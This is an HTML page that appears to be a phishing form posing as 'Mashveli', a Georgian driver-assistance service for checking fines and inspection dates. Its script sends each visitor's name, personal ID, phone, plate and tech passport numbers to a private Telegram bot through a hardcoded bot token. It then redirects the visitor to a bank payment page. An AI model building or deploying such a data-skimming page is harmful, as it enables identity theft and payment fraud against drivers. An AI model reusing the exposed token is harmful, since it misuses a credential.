<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mashveli.online.ge - Driver Assistance</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #fff;
            color: #111;
            padding: 40px 20px;
            display: flex;
            justify-content: center;
        }
        .form-container {
            max-width: 650px;
            width: 100%;
        }
        .form-title {
            font-size: 24px;
            font-weight: bold;
            color: #111;
            margin-bottom: 30px;
            line-height: 1.3;
        }
        .form-group {
            margin-bottom: 22px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            color: #111;
            margin-bottom: 8px;
        }
        .form-group input[type="text"],
        .form-group input[type="tel"] {
            width: 100%;
            padding: 10px 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            color: #555;
            background: #fff;
        }
        .form-group input:focus {
            outline: none;
            border-color: #000;
        }
        .tech-passport-img {
            width: 100%;
            max-width: 600px;
            border-radius: 6px;
            margin-bottom: 10px;
            border: 1px solid #e0e0e0;
            display: block;
        }
        .package-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .package-option {
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #ccc;
            padding: 8px 14px;
            border-radius: 6px;
            width: fit-content;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            background: #fff;
        }
        .package-option input {
            accent-color: #000;
        }
        .consent-group {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-top: 25px;
            margin-bottom: 25px;
        }
        .consent-group input {
            margin-top: 3px;
            accent-color: #000;
            width: 16px;
            height: 16px;
        }
        .consent-group label {
            font-size: 13px;
            color: #333;
            line-height: 1.4;
            font-weight: normal;
        }
        .submit-btn {
            background-color: #000;
            color: #fff;
            padding: 10px 24px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .submit-btn:hover {
            opacity: 0.85;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <div class="form-title">
            მაშველი - მძღოლის დამხმარე /<br>
            Mashveli - Driver Assistance
        </div>

        <form id="telegramForm" onsubmit="submitToTelegram(event)">
            
            <div class="form-group">
                <label>სრული სახელი / Full Name</label>
                <input type="text" id="clientName" required placeholder="აკაკი თოლორდავა">
            </div>

            <div class="form-group">
                <label>პირადი ნომერი / Personal ID *</label>
                <input type="text" id="personalId" required placeholder="11223344556">
            </div>

            <div class="form-group">
                <label>ტელეფონის ნომერი / Phone Number *</label>
                <input type="tel" id="clientPhone" required value="+995">
            </div>

            <div class="form-group">
                <label>ავტომობილის სახელმწიფო ნომერი / Car Plate Number *</label>
                <input type="text" id="carPlate" required placeholder="AT011OL">
            </div>

            <div class="form-group">
                <label>ტექპასპორტის ნომერი / Tech Passport Number *</label>
                <!-- საილუსტრაციო ფოტო სურათიდან -->
                <img src="https://i.ibb.co/3yk4876/tech-passport.png" alt="Tech Passport Sample" class="tech-passport-img" onerror="this.style.display='none'">
                <input type="text" id="techPassport" required placeholder="AA1234567">
            </div>

            <div class="form-group">
                <label>არჩეული პაკეტი / Selected Package *</label>
                <div class="package-options">
                    <label class="package-option"><input type="radio" name="package" value="7 GEL" required> 🛈 7 GEL</label>
                    <label class="package-option"><input type="radio" name="package" value="18 GEL"> 🛈 18 GEL</label>
                    <label class="package-option"><input type="radio" name="package" value="60 GEL"> 🛈 60 GEL</label>
                </div>
            </div>

            <div class="consent-group">
                <input type="checkbox" id="consent" required>
                <label for="consent">ვეთანხმები რომ ავტომობილისა და საკონტაქტო მონაცემების დამუშავებას ჯარიმებისა და ტექინსპექტირების ვადების შესამოწმებლად.</label>
            </div>

            <button type="submit" class="submit-btn">შემოწმება / Submit →</button>
        </form>
    </div>

    <script>
        function submitToTelegram(event) {
            event.preventDefault();

            const name = document.getElementById('clientName').value;
            const personalId = document.getElementById('personalId').value;
            const phone = document.getElementById('clientPhone').value;
            const carPlate = document.getElementById('carPlate').value;
            const techPassport = document.getElementById('techPassport').value;
            
            const selectedPkg = document.querySelector('input[name="package"]:checked').value;

            const botToken = "8775590632:AAEKc7eACD1SMtOyeexiwzj9L_lb7BhRcC4"; 
            const chatId = "8233255349";

            const message = `🚨 ახალი მოთხოვნა საიტიდან!\n\n` +
                            `👤 სახელი: ${name}\n` +
                            `🆔 პირადი ნომერი: ${personalId}\n` +
                            `📞 ტელეფონი: ${phone}\n` +
                            `🚗 მანქანის ნომერი: ${carPlate}\n` +
                            `📄 ტექპასპორტის ნომერი: ${techPassport}\n` +
                            `📦 არჩეული პაკეტი: ${selectedPkg}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).catch(err => console.log(err));

            const returnUrl = encodeURIComponent(window.location.origin + window.location.pathname + "?paid=true");
            window.location.href = `https://egreve.bog.ge/Carfax?return_url=${returnUrl}`;
        }
    </script>
</body>
</html>
